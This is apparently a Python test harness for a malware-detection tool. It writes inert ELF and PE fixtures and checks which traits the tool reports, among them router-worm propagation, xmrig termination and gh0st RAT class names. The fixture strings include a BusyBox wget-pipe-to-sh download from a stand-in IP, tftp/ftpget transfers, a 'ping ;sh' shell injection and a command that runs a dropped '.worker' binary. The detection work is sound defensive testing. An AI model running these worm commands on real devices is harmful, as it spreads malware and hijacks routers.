#!/usr/bin/env python3
"""Inert controls for router propagation and neutral trait relocations."""
import argparse
import json
import os
from pathlib import Path
import struct
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[3]
PROP = 'objectives/lateral-movement/worm/device-network::router-shell-busybox-payload-propagation'
ENTRY = 'micro-behaviors/process/interpreter/shell::router-cli-shell-entry-sequence'
PING = 'micro-behaviors/process/interpreter/shell::router-ping-shell-command'
KILL = 'micro-behaviors/process/terminate/command::xmrig-termination-command'
OPTION = 'micro-behaviors/process/argument/option::xmrig-donate-level-cli-flag'
HIDDEN = 'micro-behaviors/fs/path/temp::dev-shm-hidden-path'
GHOST = 'well-known/malware/rat/gh0st::gh0st-server-class-layout'
RTTI = 'metadata/binary/symbols/name::rtti-ckeyboard-manager'
TABLE = b'enable\0\0system\0\0shell\0\0\0sh\0\0linuxshell\0\0ping ;sh\0'
TRANSFERS = (b'/bin/busybox wget http://192.0.2.1/install | sh\0'
             b'/bin/busybox tftp -g\0/bin/busybox ftpget\0'
             b'/bin/busybox chmod +x .worker; ./.worker\0')


def elf(rodata):
    # A relocatable object with a RET stub, never executed by this check.
    names = b'\0.text\0.rodata\0.shstrtab\0'
    rodoff = 80
    nameoff = rodoff + len(rodata)
    shoff = (nameoff + len(names) + 15) & ~15
    data = bytearray(max(2048, shoff + 256))
    data[:64] = struct.pack('<16sHHIQQQIHHHHHH',
        b'\x7fELF\x02\x01\x01' + bytes(9), 1, 183, 1, 0, 0,
        shoff, 0, 64, 0, 0, 64, 4, 3)
    data[64:68] = bytes.fromhex('c0035fd6')
    data[rodoff:nameoff] = rodata
    data[nameoff:nameoff + len(names)] = names
    for idx, name, flags, off, size in [(1,1,6,64,4),
            (2,7,2,rodoff,len(rodata)),(3,15,0,nameoff,len(names))]:
        data[shoff + idx*64:shoff + (idx+1)*64] = struct.pack(
            '<IIQQQQIIQQ', name, 1 if idx < 3 else 3, flags,
            0, off, size, 0, 0, 1, 0)
    return bytes(data)


def pe(class_names):
    # Non-runnable PE metadata fixture; no entrypoint or executable section.
    payload = b'\0'.join(b'.?AV' + c + b'@@' for c in class_names) + b'\0'
    data = bytearray(65536)
    data[:2] = b'MZ'
    struct.pack_into('<I', data, 60, 128)
    data[128:132] = b'PE\0\0'
    struct.pack_into('<HHIIIHH', data, 132, 0x14c,1,0,0,0,224,0x2102)
    o = 152
    struct.pack_into('<H', data, o, 0x10b)
    struct.pack_into('<I', data, o+28, 0x400000)
    struct.pack_into('<II', data, o+32, 4096,512)
    struct.pack_into('<II', data, o+56, 8192,512)
    struct.pack_into('<H', data, o+68, 3)
    struct.pack_into('<I', data, o+92, 16)
    struct.pack_into('<8sIIIIIIHHI',data,o+224,b'.data',len(payload),4096,
                     1024,512,0,0,0,0,0xc0000040)
    data[512:512+len(payload)] = payload
    return bytes(data)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--cleave', default=os.environ.get('CLEAVE','cleave'))
    parser.add_argument('--scratch', required=True, type=Path)
    args = parser.parse_args()
    classes = [b'CKeyboardManager',b'CScreenManager',b'CShellManager',
               b'CKernelManager',b'CSystemManager',b'CFileManager']
    cases = {
        'router-propagation.elf': (elf(TABLE+TRANSFERS), {PROP,ENTRY,PING}, set()),
        'renamed-stage.elf': (elf(TABLE+TRANSFERS.replace(b'.worker',b'.other')), {PROP}, set()),
        'installer.elf': (elf(TRANSFERS), set(), {PROP,ENTRY,PING}),
        'cli-only.elf': (elf(TABLE), {ENTRY,PING}, {PROP}),
        'no-shell-injection.elf': (elf(TABLE.replace(b'ping ;sh',b'ping host')+TRANSFERS), {ENTRY}, {PROP,PING}),
        'incomplete-cli.elf': (elf(TABLE.replace(b'linuxshell',b'routerhelp')+TRANSFERS), {PING}, {PROP,ENTRY}),
        'no-ftp.elf': (elf(TABLE+TRANSFERS.replace(b'busybox ftpget',b'busybox status')), set(), {PROP}),
        'stop-own-miner.sh': (b'#!/bin/sh\npkill -9 -f xmrig\n', {KILL}, {'objectives/impact/degrade/rival-bot/competitor::xmrig-targeting'}),
        'rootf.elf': (elf(b'/dev/shm/rootf\0'), set(), {HIDDEN}),
        'hidden.elf': (elf(b'/dev/shm/.worker\0'), {HIDDEN}, set()),
        'option.elf': (elf(b'--donate-level\0'), {OPTION}, {'objectives/impact/cryptojacking/miner/config::xmrig-donate-level-cli-flag'}),
        'single-class.dll': (pe(classes[:1]), {RTTI}, {GHOST}),
        'five-classes.dll': (pe(classes[:5]), {RTTI}, {GHOST}),
        'six-classes.dll': (pe(classes), {RTTI,GHOST}, set()),
    }
    args.scratch.mkdir(parents=True, exist_ok=True)
    with tempfile.TemporaryDirectory(dir=args.scratch) as temp:
        tmp = Path(temp)
        for name,(content,_,_) in cases.items(): (tmp/name).write_bytes(content)
        proc = subprocess.run([args.cleave,'--no-update-check','--traits-dir',str(ROOT),
            '--format','json',str(tmp)],cwd=ROOT,text=True,capture_output=True,check=True)
        docs, remaining = [], proc.stdout.strip()
        decoder = json.JSONDecoder()
        while remaining:
            doc, consumed = decoder.raw_decode(remaining)
            docs.append(doc)
            remaining = remaining[consumed:].lstrip()
        files = [f for doc in docs for f in doc.get('files',[doc])]
        byname = {Path(f['path']).name: {t['id']:t for t in f['traits']} for f in files}
        for name,(_,want,reject) in cases.items():
            found = byname.get(name,{})
            assert not (want-set(found)), (name,'missing',want-set(found))
            assert not (reject&set(found)), (name,'unexpected',reject&set(found))
            for trait in want & {KILL,OPTION,HIDDEN,RTTI,ENTRY,PING}:
                assert found[trait]['crit']==3,(name,trait,found[trait]['crit'])
        print(f'{len(cases)} inert positive/near-miss controls passed')


if __name__ == '__main__': main()
